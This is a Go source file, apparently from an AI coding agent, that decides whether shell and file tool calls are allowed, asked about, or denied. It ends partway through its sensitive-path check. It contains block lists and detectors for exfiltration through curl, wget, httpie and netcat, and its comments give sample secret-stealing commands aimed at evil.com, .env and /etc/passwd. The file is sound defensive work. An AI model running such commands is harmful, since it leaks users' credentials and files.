package agent

import (
	"encoding/json"
	"fmt"
	"net/url"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"unicode"

	"github.com/u007/ocode/internal/config"
)

type PermissionLevel string

const (
	PermissionAllow PermissionLevel = "allow"
	PermissionDeny  PermissionLevel = "deny"
	PermissionAsk   PermissionLevel = "ask"
)

type PermissionMode string

const (
	PermissionModeNormal PermissionMode = "normal"
	PermissionModeYOLO   PermissionMode = "yolo"
	PermissionModeLocked PermissionMode = "locked"
)

type PermissionScope string

const (
	PermissionScopeTool       PermissionScope = "tool"
	PermissionScopeBashPrefix PermissionScope = "bash_prefix"
)

type PermissionRequest struct {
	ToolName string          `json:"tool_name"`
	Args     json.RawMessage `json:"args,omitempty"`
	Command  string          `json:"command,omitempty"`
	Prefix   string          `json:"prefix,omitempty"`
	Scope    PermissionScope `json:"scope"`
	Rule     string          `json:"rule"`
}

type PermissionDecision struct {
	Level   PermissionLevel
	Request *PermissionRequest
}

// PermissionResponse is returned by an interactive permission callback. Level
// answers the current request. PersistRule/PersistTool additionally tell the
// agent handling the request to update its own PermissionManager, so an
// "always allow" answer applies immediately inside the currently running
// sub-agent as well as wherever the UI persists the setting.
type PermissionResponse struct {
	Level       PermissionLevel
	PersistRule bool
	PersistTool bool
}

type pathPatternEntry struct {
	pattern string
	level   PermissionLevel
}

type PermissionManager struct {
	mode                  PermissionMode
	rules                 map[string]PermissionLevel
	patterns              []patternRule
	pathPatterns          map[string][]pathPatternEntry // toolName → path-glob patterns
	bashPrefixes          map[string]PermissionLevel
	bashAutoAllow         map[string]bool
	bashPrefixModes       map[string]string
	workDir               string
	webfetchDomains       map[string]PermissionLevel
	autoPermissionEnabled bool
}

type patternRule struct {
	pattern string
	level   PermissionLevel
}

const bashInRootPersistPrefix = "__inroot__:"

// bashAutoAllowPrefixes are commands that take filesystem path arguments and
// are auto-allowed only when every path resolves inside the current workdir.
// All entries here MUST be safe to run on any in-root path (read-only, or
// mutating-but-bounded like `sed -i`). Commands that can have side effects
// outside the working tree (network, subprocess execution, package installs)
// MUST NOT be added here — use bashSubcommandAllow instead.
var bashAutoAllowPrefixes = map[string]bool{
	// Text processing (reads inputs, writes to stdout)
	"awk":      true,
	"sed":      true,
	"tr":       true,
	"cat":      true,
	"tac":      true,
	"rev":      true,
	"head":     true,
	"tail":     true,
	"less":     true,
	"more":     true,
	"nl":       true,
	"sort":     true,
	"uniq":     true,
	"cut":      true,
	"paste":    true,
	"join":     true,
	"comm":     true,
	"column":   true,
	"expand":   true,
	"unexpand": true,
	"fold":     true,
	"wc":       true,
	"grep":     true,
	"rg":       true,
	"ag":       true,
	// File / directory inspection
	"ls":       true,
	"tree":     true,
	"file":     true,
	"stat":     true,
	"du":       true,
	"basename": true,
	"dirname":  true,
	"realpath": true,
	"readlink": true,
	"diff":     true,
	"cmp":      true,
	// Hashing
	"md5sum":    true,
	"sha1sum":   true,
	"sha256sum": true,
	"sha512sum": true,
	"shasum":    true,
	"cksum":     true,
	// Binary inspection
	"xxd":     true,
	"hexdump": true,
	"od":      true,
	"strings": true,
	// Structured data
	"jq": true,
	"yq": true,
	// Path-aware search (extra flag inspection in canAutoAllowInRoot)
	"find": true,
	"fd":   true,
	"cd":   true,
}

const (
	bashPrefixModeReadOnly = "read_only"
	bashPrefixModeMutating = "mutating"
	bashPrefixModeNever    = "never_auto"
)

// bashAutoAllowDefaultModes defaults every entry in bashAutoAllowPrefixes to
// read_only. Overrides for genuinely mutating commands (sed -i, etc.) are
// listed explicitly below.
var bashAutoAllowDefaultModes = func() map[string]string {
	m := make(map[string]string, len(bashAutoAllowPrefixes))
	for prefix := range bashAutoAllowPrefixes {
		m[prefix] = bashPrefixModeReadOnly
	}
	m["sed"] = bashPrefixModeMutating
	return m
}()

// bashAlwaysAllow are commands that have no filesystem path arguments and no
// meaningful side effects. They auto-allow regardless of workdir.
// Anything that can execute another program (env, command, exec, sudo, etc.)
// MUST NOT be added here.
var bashAlwaysAllow = map[string]bool{
	"pwd":      true,
	"whoami":   true,
	"hostname": true,
	"uname":    true,
	"id":       true,
	"tty":      true,
	"date":     true,
	"true":     true,
	"false":    true,
	":":        true,
	"echo":     true,
	"printf":   true,
	"which":    true,
	"type":     true,
	"locale":   true,
	"tput":     true,
	"groups":   true,
	"users":    true,
	"uptime":   true,
	"arch":     true,
}

// bashSubcommandAllow maps "<prefix> <subcommand>" (and optionally three-word
// "<prefix> <sub1> <sub2>") strings to true for subcommand-pinned auto-allow.
// Use only for subcommands that are read-only OR project-trusted (operate on
// the working tree but don't reach outside it without an explicit path arg).
//
// Entries here intentionally do NOT path-scope further — a subcommand listed
// here is allowed regardless of args. Do not add subcommands that take an
// arbitrary path and write to it (e.g. `git apply`, `git checkout --`).
var bashSubcommandAllow = map[string]bool{
	// git — read-only subcommands only (no push/reset/checkout/clean/apply)
	"git status":       true,
	"git diff":         true,
	"git log":          true,
	"git show":         true,
	"git blame":        true,
	"git describe":     true,
	"git rev-parse":    true,
	"git rev-list":     true,
	"git ls-files":     true,
	"git ls-tree":      true,
	"git ls-remote":    true,
	"git reflog":       true,
	"git shortlog":     true,
	"git cat-file":     true,
	"git grep":         true,
	"git name-rev":     true,
	"git for-each-ref": true,
	// Intentionally NOT in the list: branch, tag, remote, stash, worktree,
	// submodule, config, fetch, pull, push, reset, checkout, clean, apply,
	// am, cherry-pick, rebase, revert, restore, switch, merge, init, add,
	// commit. Some of these are read-only without args but become destructive
	// with flags (e.g. `git branch -D`, `git tag -d`). Require explicit user
	// approval.
	// gh CLI — viewing only (intentionally omits `gh api` which can POST)
	"gh pr":       true,
	"gh issue":    true,
	"gh run":      true,
	"gh repo":     true,
	"gh auth":     true,
	"gh release":  true,
	"gh workflow": true,
	"gh label":    true,
	"gh search":   true,
	"gh ruleset":  true,
	// Go toolchain
	"go build":    true,
	"go test":     true,
	"go run":      true,
	"go vet":      true,
	"go fmt":      true,
	"go list":     true,
	"go doc":      true,
	"go env":      true,
	"go version":  true,
	"go mod":      true,
	"go tool":     true,
	"go generate": true,
	"go work":     true,
	"gofmt":       true,
	"goimports":   true,
	// Rust toolchain
	"cargo check":    true,
	"cargo build":    true,
	"cargo test":     true,
	"cargo clippy":   true,
	"cargo fmt":      true,
	"cargo doc":      true,
	"cargo tree":     true,
	"cargo metadata": true,
	"cargo version":  true,
	"cargo run":      true,
	// Python / TS type-checkers / formatters (project-scoped tools)
	"pytest":       true,
	"ruff":         true,
	"mypy":         true,
	"basedpyright": true,
	"tsc":          true,
	"tsgo":         true,
	"eslint":       true,
	"prettier":     true,
	"biome":        true,
	"vitest":       true,
	// Docker — read-only inspection
	"docker ps":             true,
	"docker images":         true,
	"docker logs":           true,
	"docker inspect":        true,
	"docker version":        true,
	"docker info":           true,
	"docker history":        true,
	"docker port":           true,
	"docker top":            true,
	"docker stats":          true,
	"docker compose ps":     true,
	"docker compose logs":   true,
	"docker compose config": true,
	"docker compose top":    true,
	"docker compose port":   true,
	"docker compose images": true,
	"docker compose ls":     true,
	// Node package managers — project-trusted script runners + read commands.
	// Same trust model as `make`: scripts can do anything, but they live in
	// the project's manifest.
	"npm run":       true,
	"npm test":      true,
	"npm list":      true,
	"npm ls":        true,
	"npm outdated":  true,
	"npm view":      true,
	"npm info":      true,
	"npm audit":     true,
	"npm fund":      true,
	"npm doctor":    true,
	"npm ping":      true,
	"npm search":    true,
	"pnpm run":      true,
	"pnpm test":     true,
	"pnpm list":     true,
	"pnpm ls":       true,
	"pnpm outdated": true,
	"pnpm view":     true,
	"pnpm info":     true,
	"pnpm audit":    true,
	"pnpm why":      true,
	"pnpm doctor":   true,
	"yarn run":      true,
	"yarn test":     true,
	"yarn list":     true,
	"yarn outdated": true,
	"yarn info":     true,
	"yarn audit":    true,
	"yarn why":      true,
	"bun run":       true,
	"bun test":      true,
	// make: project-trusted, all targets (same risk model as before).
	"make": true,
}

// findUnsafeFlags are flags on `find` that can execute subprocesses or delete
// files. Any of these makes the command non-auto-allowable.
var findUnsafeFlags = map[string]bool{
	"-exec": true, "-execdir": true, "-ok": true, "-okdir": true,
	"-delete": true, "-fprint": true, "-fprintf": true,
	"-fprint0": true, "-fls": true,
}

// fdUnsafeFlags are flags on `fd` that can execute subprocesses.
var fdUnsafeFlags = map[string]bool{
	"-x": true, "--exec": true, "-X": true, "--exec-batch": true,
}

// pathScopedTools are file tools whose decision depends on the target path
// (workdir scope, sensitive paths). Membership must stay in sync with the
// path-returning cases of extractPathFromArgs.
var pathScopedTools = map[string]bool{
	"read": true, "write": true, "edit": true, "delete": true,
	"multiedit": true, "multi_file_edit": true, "replace_lines": true, "glob": true, "grep": true,
	"list": true, "lsp": true, "apply_patch": true, "format": true, "repo_overview": true,
}

// harmfulBashPrefixes are git subcommand prefixes that are inherently
// destructive or risky. Commands matching any of these prefixes
// should never be auto-allowed by the LLM auto-permission layer, and
// cannot be persisted as "always allow" rules.
//
// Each entry is a two-word prefix (e.g. "git revert") that locks the
// whole subcommand family as harmful. Force-flagged single commands
// (e.g. "git push" with --force) are handled separately in
// IsHarmfulBashCommand.
var harmfulBashPrefixes = map[string]bool{
	"git revert":   true, // undo commits (rewrites history)
	"git stash":    true, // stash/unstash (can lose uncommitted changes)
	"git reset":    true, // reset HEAD/index/working-tree
	"git clean":    true, // remove untracked files
	"git checkout": true, // can discard working-tree changes
	"git restore":  true, // can discard working-tree changes
	"git switch":   true, // can discard working-tree changes
}

// harmfulBashForceFlags lists git subcommands that are only harmful
// when a specific force flag is present. The map value is the set of
// flags that make the command harmful.
var harmfulBashForceFlags = map[string]map[string]bool{
	"git push": {"--force": true, "-f": true},
	"git pull": {"--force": true, "-f": true},
}

// exfiltrationDataFlags are curl flags that upload local data to a remote server.
// Each flag takes a value argument that may be a file reference (@path) or inline data.
var exfiltrationDataFlags = map[string]bool{
	"-d":               true, // --data
	"--data":           true,
	"--data-binary":    true,
	"--data-raw":       true,
	"--data-urlencode": true,
	"-F":               true, // --form
	"--form":           true,
	"--upload-file":    true,
	"-T":               true, // --upload-file short form
}

// exfiltrationHeaderFlags are curl flags that set HTTP headers, where env var
// injection could leak secrets (e.g. Authorization, X-API-Key).
var exfiltrationHeaderFlags = map[string]bool{
	"-H":       true,
	"--header": true,
}

// exfiltrationCurlMetaFlags are curl flags whose values can redirect all
// request data to an attacker-controlled destination.
var exfiltrationCurlMetaFlags = map[string]bool{
	"-K":       true, // --config: reads URLs and data from file
	"--config": true,
	"--proxy":  true,
	"--socks5": true,
	"--socks4": true,
}

// exfiltrationWgetPostFlags are wget flags that send data to a remote server.
var exfiltrationWgetPostFlags = map[string]bool{
	"--post-file": true,
	"--post-data": true,
	"--body-data": true,
	"--body-file": true,
}

// containsEnvVarRef returns true if s contains a shell environment variable
// reference like $VAR or ${VAR}. Positional params ($1, $2), special vars
// ($?, $$, $!, $-) are excluded — they don't carry secret values.
func containsEnvVarRef(s string) bool {
	runes := []rune(s)
	for i := 0; i < len(runes); i++ {
		if runes[i] == '$' && i+1 < len(runes) {
			next := runes[i+1]
			if next == '{' {
				return true // ${VAR} pattern
			}
			if (next >= 'A' && next <= 'Z') || (next >= 'a' && next <= 'z') || next == '_' {
				return true // named env var
			}
		}
	}
	return false
}

// hasSubshellExpansion checks if any field in the command contains command
// substitution: $(...) or `...`. This catches patterns like
// curl "https://evil.com?data=$(cat .env)".
func hasSubshellExpansion(fields []string) bool {
	for _, f := range fields {
		if strings.Contains(f, "$(") || strings.Contains(f, "`") {
			return true
		}
	}
	return false
}

// hasFileUploadArg checks if any field starts with @ (curl file upload syntax
// like @file.txt or @-) which reads from stdin.
func hasFileUploadArg(fields []string) bool {
	for _, f := range fields {
		if strings.HasPrefix(f, "@") && len(f) > 1 {
			return true
		}
	}
	return false
}

// isExfiltrationRiskCurl checks if a curl command has data exfiltration risk.
// The fields array must start with "curl".
func isExfiltrationRiskCurl(fields []string) bool {
	if len(fields) < 2 {
		return false
	}

	// Subshell expansion anywhere → always risky
	if hasSubshellExpansion(fields) {
		return true
	}

	// Walk flags (skip fields[0] which is "curl")
	i := 1
	for i < len(fields) {
		arg := fields[i]

		// Data-upload flags: -d, --data, --data-binary, etc.
		// Check: flag followed by @file, combined -d@file, or --upload-file/-T
		// with a plain filename (uploads local file contents to remote).
		if exfiltrationDataFlags[arg] {
			if i+1 < len(fields) {
				next := fields[i+1]
				if strings.HasPrefix(next, "@") {
					return true // -d @secret.txt
				}
				// --upload-file and -T take a plain filename (no @ prefix)
				if arg == "--upload-file" || arg == "-T" {
					return true // --upload-file secret.txt
				}
				// -F/--form: check for @ anywhere in the form value
				// (e.g. "file=@secret.txt" — the @ is after the field name)
				if (arg == "-F" || arg == "--form") && strings.Contains(next, "@") {
					return true // -F file=@secret.txt
				}
			}
			i++
			continue
		}
		// Combined form: -d@file.txt (no space)
		if strings.HasPrefix(arg, "-d@") || strings.HasPrefix(arg, "--data@") {
			return true
		}

		// Header flags: -H, --header with env var ref
		if exfiltrationHeaderFlags[arg] {
			if i+1 < len(fields) && containsEnvVarRef(fields[i+1]) {
				return true // -H "Authorization: $TOKEN"
			}
			i++
			continue
		}

		// Meta flags: --config, --proxy, --socks5 with file/env var
		if exfiltrationCurlMetaFlags[arg] {
			if i+1 < len(fields) {
				next := fields[i+1]
				if strings.HasPrefix(next, "@") || containsEnvVarRef(next) {
					return true
				}
			}
			i++
			continue
		}

		i++
	}

	// Check non-flag args (URL position): env var in URL
	// First non-flag arg is the URL
	foundFlag := false
	for _, f := range fields[1:] {
		if strings.HasPrefix(f, "-") {
			foundFlag = true
			continue
		}
		if !foundFlag || !strings.Contains(f, "://") {
			// First positional arg that looks like a URL
			if containsEnvVarRef(f) {
				return true // curl $URL
			}
			break
		}
	}

	return false
}

// isExfiltrationRiskWget checks if a wget command has data exfiltration risk.
func isExfiltrationRiskWget(fields []string) bool {
	if len(fields) < 2 {
		return false
	}

	if hasSubshellExpansion(fields) {
		return true
	}

	i := 1
	for i < len(fields) {
		arg := fields[i]

		// --post-file=<file>, --post-data=<data>, etc. (equals form)
		if strings.HasPrefix(arg, "--post-file=") ||
			strings.HasPrefix(arg, "--post-data=") ||
			strings.HasPrefix(arg, "--body-data=") ||
			strings.HasPrefix(arg, "--body-file=") {
			return true
		}

		// --post-file <file> (space-separated form)
		if exfiltrationWgetPostFlags[arg] {
			if i+1 < len(fields) {
				return true
			}
		}

		// -i <file>: reads URLs from file
		if arg == "-i" && i+1 < len(fields) {
			return true
		}

		i++
	}

	return false
}

// isExfiltrationRiskHTTPie checks if an httpie command has data exfil risk.
// httpie uses positional args: http [OPTIONS] METHOD URL [KEY:VALUE...] [DATA...]
func isExfiltrationRiskHTTPie(fields []string) bool {
	if len(fields) < 2 {
		return false
	}

	if hasSubshellExpansion(fields) {
		return true
	}

	hasForm := false
	for _, f := range fields[1:] {
		if f == "--form" || f == "-f" {
			hasForm = true
		}
	}

	// --form with file@ pattern: http --form POST url file@/etc/passwd
	if hasForm {
		for _, f := range fields[1:] {
			if strings.Contains(f, "@") && !strings.HasPrefix(f, "@") {
				return true
			}
		}
	}

	// Positional header values with env vars: http POST url Authorization:"$TOKEN"
	// Headers are Key:Value args, typically after METHOD URL
	for _, f := range fields[2:] {
		if strings.Contains(f, ":") && containsEnvVarRef(f) {
			return true
		}
	}

	// --auth/-a with env var (two-pass since args are positional)
	for i, f := range fields[1:] {
		if f == "--auth" || f == "-a" {
			idx := i + 2 // +1 for fields[0] offset, +1 for next arg
			if idx < len(fields) && containsEnvVarRef(fields[idx]) {
				return true
			}
		}
	}

	return false
}

// isExfiltrationRiskNetcat checks if a netcat/nc command sends data to a remote host.
// Port-scan-only flags (-z, -zv, -zw) are not exfiltration risk — they test
// connectivity without transmitting application data. Data-sending risk is
// flagged when stdin is redirected or no scan-only flag is present.
func isExfiltrationRiskNetcat(fields []string) bool {
	if len(fields) < 2 {
		return false
	}

	// Check for stdin redirection: nc host port < file
	for _, f := range fields[1:] {
		if f == "<" {
			return true
		}
	}

	// Check for scan-only flags (-z, -zv, -zn, -zw, etc.)
	// If -z is present, it's a port scan — no data sent.
	hasScanFlag := false
	for _, f := range fields[1:] {
		if strings.HasPrefix(f, "-") && !strings.HasPrefix(f, "--") {
			// Short flag group: check each char for 'z'
			for _, ch := range f[1:] {
				if ch == 'z' {
					hasScanFlag = true
					break
				}
			}
		}
		if hasScanFlag {
			break
		}
	}

	if hasScanFlag {
		return false // port scan only — no data exfiltration
	}

	// nc with host+port and no scan flag: can send arbitrary data
	return true
}

// isExfiltrationRiskCommand checks if a bash command has data exfiltration
// risk patterns. This covers curl, wget, httpie, and netcat.
func isExfiltrationRiskCommand(command string) bool {
	fields := splitShellFields(command)
	if len(fields) == 0 {
		return false
	}

	switch fields[0] {
	case "curl":
		return isExfiltrationRiskCurl(fields)
	case "wget":
		return isExfiltrationRiskWget(fields)
	case "http", "https":
		return isExfiltrationRiskHTTPie(fields)
	case "nc", "ncat":
		return isExfiltrationRiskNetcat(fields)
	}

	return false
}

// IsHarmfulBashCommand returns true when the given bash command is
// inherently destructive or risky and should never be auto-allowed.
// This covers:
//   - git revert, stash, reset, clean, checkout, restore, switch (any args)
//   - git push / pull with --force or -f
//   - curl/wget/httpie with data exfiltration risk (file upload, env var
//     injection, subshell expansion)
//   - netcat commands that can send arbitrary data
//
// Harmful operations always require human approval — they cannot be
// auto-allowed by the LLM auto-permission layer and cannot be
// persisted as "always allow" rules.
func IsHarmfulBashCommand(command string) bool {
	cmd := strings.TrimSpace(command)
	parts := strings.Fields(cmd)
	if len(parts) < 2 {
		return false
	}

	// --- Git destructive commands ---
	if parts[0] == "git" {
		prefix := parts[0] + " " + parts[1]
		if harmfulBashPrefixes[prefix] {
			return true
		}
		if flags, ok := harmfulBashForceFlags[prefix]; ok {
			for _, part := range parts[2:] {
				if flags[part] {
					return true
				}
			}
		}
	}

	// --- Data exfiltration risk (curl, wget, httpie, nc) ---
	if isExfiltrationRiskCommand(cmd) {
		return true
	}

	return false
}

// IsHarmfulRequest checks whether a permission request is for a
// harmful operation that requires human approval even when the
// auto-permission layer is active. Bash commands are checked via
// IsHarmfulBashCommand; other tools can be added here as needed.
func IsHarmfulRequest(req PermissionRequest) bool {
	if req.ToolName == "bash" && req.Command != "" {
		return IsHarmfulBashCommand(req.Command)
	}
	return false
}

func NewPermissionManager() *PermissionManager {
	pm := &PermissionManager{
		mode:            PermissionModeNormal,
		rules:           make(map[string]PermissionLevel),
		patterns:        make([]patternRule, 0),
		pathPatterns:    make(map[string][]pathPatternEntry),
		bashPrefixes:    make(map[string]PermissionLevel),
		bashAutoAllow:   make(map[string]bool),
		bashPrefixModes: make(map[string]string),
		webfetchDomains: make(map[string]PermissionLevel),
	}
	for k, v := range bashAutoAllowPrefixes {
		pm.bashAutoAllow[k] = v
	}
	for k, v := range bashAutoAllowDefaultModes {
		pm.bashPrefixModes[k] = v
	}
	for _, name := range []string{"read", "glob", "grep", "list", "lsp", "lsp_diagnostics", "skill", "question", "todoread", "todowrite", "advisor", "task", "task_status", "agent_status", "repo_overview", "plan_enter", "plan_exit", "wait", "bash_output", "kill_shell"} {
		pm.rules[name] = PermissionAllow
	}
	for _, name := range []string{"write", "edit", "multiedit", "multi_file_edit", "replace_lines", "apply_patch", "format"} {
		pm.SetRule(name, PermissionAllow)
	}
	for _, name := range []string{"delete", "bash", "webfetch", "websearch", "repo_clone", "mcp_*"} {
		pm.SetRule(name, PermissionAsk)
	}
	return pm
}

func (pm *PermissionManager) Check(toolName string) PermissionLevel {
	if level, ok := pm.rules[toolName]; ok {
		return level
	}

	for _, p := range pm.patterns {
		if matchPattern(p.pattern, toolName) {
			return p.level
		}
	}

	return PermissionAsk
}

func (pm *PermissionManager) LoadFromConfig(cfg map[string]interface{}) {
	if cfg == nil {
		return
	}
	for toolName, val := range cfg {
		switch v := val.(type) {
		case string:
			pm.SetRule(toolName, PermissionLevel(v))
		case map[string]interface{}:
			for pattern, levelVal := range v {
				if levelStr, ok := levelVal.(string); ok {
					level := PermissionLevel(levelStr)
					if validPermissionLevel(level) {
						pm.SetPathRule(toolName, pattern, level)
					}
				}
			}
		}
	}
}

func (pm *PermissionManager) LoadFromOcode(cfg config.PermissionConfig) {
	if cfg.Mode != "" {
		pm.SetMode(PermissionMode(cfg.Mode))
	}
	if cfg.Auto != nil {
		pm.SetAutoPermissionEnabled(cfg.Auto.Enabled)
	} else {
		pm.SetAutoPermissionEnabled(false)
	}
	for k, v := range cfg.Tools {
		level := PermissionLevel(v)
		if validPermissionLevel(level) {
			pm.SetRule(k, level)
		}
	}
	for k, v := range cfg.Bash.Prefixes {
		level := PermissionLevel(v)
		if validPermissionLevel(level) {
			pm.SetBashPrefixRule(k, level)
		}
	}
	for _, prefix := range cfg.Bash.AutoAllowPrefixes {
		prefix = strings.TrimSpace(prefix)
		if prefix == "" {
			continue
		}
		pm.bashAutoAllow[prefix] = true
		if _, ok := pm.bashPrefixModes[prefix]; !ok {
			pm.bashPrefixModes[prefix] = bashPrefixModeReadOnly
		}
	}
	for prefix, mode := range cfg.Bash.PrefixModes {
		mode = strings.TrimSpace(mode)
		if mode != bashPrefixModeReadOnly && mode != bashPrefixModeMutating && mode != bashPrefixModeNever {
			continue
		}
		pm.bashPrefixModes[prefix] = mode
	}
}

func (pm *PermissionManager) Decide(toolName string, args json.RawMessage) PermissionDecision {
	emitDebug("perm", fmt.Sprintf("Decide: tool=%s mode=%s", toolName, pm.mode))
	if pm.mode == PermissionModeLocked {
		if isReadOnlyTool(toolName) {
			emitDebug("perm", fmt.Sprintf("Decide ALLOW (locked, read-only): tool=%s", toolName))
			return PermissionDecision{Level: PermissionAllow}
		}
		emitDebug("perm", fmt.Sprintf("Decide DENY (locked, not read-only): tool=%s", toolName))
		return PermissionDecision{Level: PermissionDeny}
	}

	if toolName == "bash" {
		command := bashCommand(args)
		if isHardBlockedCommand(command) {
			emitDebug("perm", fmt.Sprintf("Decide DENY (hard-blocked): tool=bash command=%q", command))
			return PermissionDecision{Level: PermissionDeny}
		}
		if pm.mode == PermissionModeYOLO {
			emitDebug("perm", fmt.Sprintf("Decide ALLOW (yolo): tool=bash"))
			return PermissionDecision{Level: PermissionAllow}
		}

		// Parse the compound command
		parsedCmds, err := parseShellCommandLine(command)
		if err != nil {
			// Parsing error (unbalanced quotes, etc.): fallback to asking for safety
			level := pm.Check(toolName)
			if level == PermissionAsk {
				return PermissionDecision{Level: PermissionAsk, Request: bashPermissionRequest(args, command, "")}
			}
			return PermissionDecision{Level: level}
		}

		// Evaluate each constituent command, environment variable, and redirection
		var finalDecision *PermissionDecision
		for _, cmd := range parsedCmds {
			dec := pm.decideSingleCommand(args, cmd)
			if dec.Level == PermissionDeny {
				return dec
			}
			if dec.Level == PermissionAsk {
				// Keep track of the first Ask decision to return if none are Deny
				if finalDecision == nil {
					finalDecision = &dec
				}
			}
		}

		if finalDecision != nil {
			return *finalDecision
		}
		emitDebug("perm", fmt.Sprintf("Decide ALLOW (bash, no ask/deny): tool=bash"))
		return PermissionDecision{Level: PermissionAllow}
	}

	if pm.mode == PermissionModeYOLO {
		emitDebug("perm", fmt.Sprintf("Decide ALLOW (yolo): tool=%s", toolName))
		return PermissionDecision{Level: PermissionAllow}
	}

	if pathScopedTools[toolName] {
		path := extractPathFromArgs(toolName, args)
		if path != "" {
			// Check path-based permission patterns first (e.g., opencode.json
			// "permission" entries with glob patterns). An explicit "allow" or
			// "deny" overrides the normal workdir/sensitive checks.
			if level := pm.CheckPathPatterns(toolName, path); level != "" {
				if level == PermissionAsk {
					emitDebug("perm", fmt.Sprintf("Decide ASK (path pattern): tool=%s path=%s", toolName, path))
					return PermissionDecision{Level: PermissionAsk, Request: &PermissionRequest{
						ToolName: toolName, Args: args, Scope: PermissionScopeTool, Rule: "tool." + toolName + ".path_pattern",
					}}
				}
				emitDebug("perm", fmt.Sprintf("Decide %s (path pattern): tool=%s path=%s", level, toolName, path))
				return PermissionDecision{Level: level}
			}
			// Relative paths and glob patterns (non-absolute) are implicitly within workDir
			if filepath.IsAbs(path) && !isWithinWorkDir(pm, path) {
				// Temp directories are always allowed (cross-platform)
				if isTempDir(path) {
					emitDebug("perm", fmt.Sprintf("Decide ALLOW (temp dir): tool=%s path=%s", toolName, path))
					return PermissionDecision{Level: PermissionAllow}
				}
				// Check tool-level rule first — an explicit "allow" (from "always
				// allow this rule/tool") overrides the out-of-scope gate so the user
				// isn't asked repeatedly for the same permitted tool.
				if pm.Check(toolName) == PermissionAllow {
					emitDebug("perm", fmt.Sprintf("Decide ALLOW (out-of-scope, tool allowed): tool=%s path=%s", toolName, path))
					return PermissionDecision{Level: PermissionAllow}
				}
				emitDebug("perm", fmt.Sprintf("Decide ASK (out-of-scope): tool=%s path=%s", toolName, path))
				return PermissionDecision{Level: PermissionAsk, Request: &PermissionRequest{
					ToolName: toolName, Args: args, Scope: PermissionScopeTool, Rule: "tool." + toolName + ".out_of_scope",
				}}
			}
			if isSensitivePath(path) {
				if pm.Check(toolName) == PermissionAllow {
					emitDebug("perm", fmt.Sprintf("Decide ALLOW (sensitive, tool allowed): tool=%s path=%s", toolName, path))
					return PermissionDecision{Level: PermissionAllow}
				}
				emitDebug("perm", fmt.Sprintf("Decide ASK (sensitive): tool=%s path=%s", toolName, path))
				return PermissionDecision{Level: PermissionAsk, Request: &PermissionRequest{
					ToolName: toolName, Args: args, Scope: PermissionScopeTool, Rule: "tool." + toolName + ".sensitive_path",
				}}
			}
			if toolName == "delete" {
				if pm.Check(toolName) == PermissionAllow {
					emitDebug("perm", fmt.Sprintf("Decide ALLOW (delete, tool allowed): tool=%s path=%s", toolName, path))
					return PermissionDecision{Level: PermissionAllow}
				}
				emitDebug("perm", fmt.Sprintf("Decide ASK (delete): tool=%s path=%s", toolName, path))
				return PermissionDecision{Level: PermissionAsk, Request: &PermissionRequest{
					ToolName: toolName, Args: args, Scope: PermissionScopeTool, Rule: "tool." + toolName + ".delete",
				}}
			}
			emitDebug("perm", fmt.Sprintf("Decide ALLOW (path in workdir): tool=%s path=%s", toolName, path))
			return PermissionDecision{Level: PermissionAllow}
		}
	}

	// Webfetch domain tracking
	if toolName == "webfetch" {
		path := extractPathFromArgs(toolName, args)
		domain := extractDomainFromURL(path)
		if domain != "" {
			if level, exists := pm.webfetchDomains[domain]; exists {
				emitDebug("perm", fmt.Sprintf("Decide %s (webfetch domain cached): tool=%s domain=%s", level, toolName, domain))
				return PermissionDecision{Level: level}
			}
			emitDebug("perm", fmt.Sprintf("Decide ASK (webfetch domain): tool=%s domain=%s", toolName, domain))
			return PermissionDecision{Level: PermissionAsk, Request: &PermissionRequest{
				ToolName: toolName, Args: args, Scope: PermissionScopeTool, Rule: "webfetch.domain." + domain,
			}}
		}
	}

	level := pm.Check(toolName)
	if level == PermissionAsk {
		emitDebug("perm", fmt.Sprintf("Decide ASK (tool rule): tool=%s", toolName))
		return PermissionDecision{Level: PermissionAsk, Request: &PermissionRequest{ToolName: toolName, Args: args, Scope: PermissionScopeTool, Rule: "tool." + toolName}}
	}
	emitDebug("perm", fmt.Sprintf("Decide %s (tool rule): tool=%s", level, toolName))
	return PermissionDecision{Level: level}
}

func bashPermissionRequest(args json.RawMessage, command, prefix string) *PermissionRequest {
	scope := PermissionScopeTool
	rule := "tool.bash"
	if prefix != "" {
		scope = PermissionScopeBashPrefix
		rule = "bash.prefix." + prefix
	}
	return &PermissionRequest{ToolName: "bash", Args: args, Command: command, Prefix: prefix, Scope: scope, Rule: rule}
}

func isWithinWorkDir(pm *PermissionManager, rawPath string) bool {
	if pm.workDir == "" {
		return true
	}
	absPath, err := filepath.Abs(rawPath)
	if err != nil {
		return false
	}
	resolved, err := filepath.EvalSymlinks(absPath)
	if err != nil {
		// File may not exist yet (e.g., write creating new file); check directory
		dir := filepath.Dir(absPath)
		resolved, err = filepath.EvalSymlinks(dir)
		if err != nil {
			return false
		}
		resolved = filepath.Join(resolved, filepath.Base(absPath))
	}
	workDirSep := pm.workDir + string(filepath.Separator)
	return resolved == pm.workDir || strings.HasPrefix(resolved, workDirSep)
}

// isTempDir returns true if the given path is within a well-known system temp
// directory. Only matches well-known paths, NOT os.TempDir() (which on macOS
// returns /var/folders/.../T/ — too broad for auto-allow).
func isTempDir(rawPath string) bool {
	absPath, err := filepath.Abs(rawPath)
	if err != nil {
		return false
	}
	clean := filepath.Clean(absPath)

	// Well-known temp directories — these are always safe to auto-allow.
	unixTempDirs := []string{"/tmp", "/var/tmp"}
	for _, td := range unixTempDirs {
		tdClean := td + string(filepath.Separator)
		if clean == td || strings.HasPrefix(clean, tdClean) {
			return true
		}
	}

	return false
}

// allArgsAreTempDirs checks if all arguments in a bash command that look like
// absolute file paths are within temp directories. This allows commands like "ls /tmp"
// or "cat /tmp/foo.txt" to be auto-allowed.
func allArgsAreTempDirs(cmdWords []string) bool {
	if len(cmdWords) < 2 {
		return false
	}
	hasPathArg := false
	// Skip the command itself (first word)
	for _, arg := range cmdWords[1:] {
		// Skip flags (start with -)
		if strings.HasPrefix(arg, "-") {
			continue
		}
		// Skip output redirections (handled separately)
		if arg == ">" || arg == ">>" || arg == "1>" || arg == "2>" {
			continue
		}
		// Only check absolute paths (must start with /)
		if strings.HasPrefix(arg, "/") {
			hasPathArg = true
			if !isTempDir(arg) {
				return false
			}
		}
	}
	// Only allow if there was at least one absolute path arg and all were temp dirs
	return hasPathArg
}

func isSensitivePath(path string) bool {
	clean := filepath.ToSlash(filepath.Clean(path))
	base := filepath.Base(clean)

	// Exact match sensitive filenames
	sensitiveBases := []string{".env", ".netrc", ".npmrc", ".pypirc"}
	for _, s := range sensitiveBases {
		if base == s {
			return true
		}
	}

	// .env.* variants
	if strings.HasPrefix(base, ".env.") {
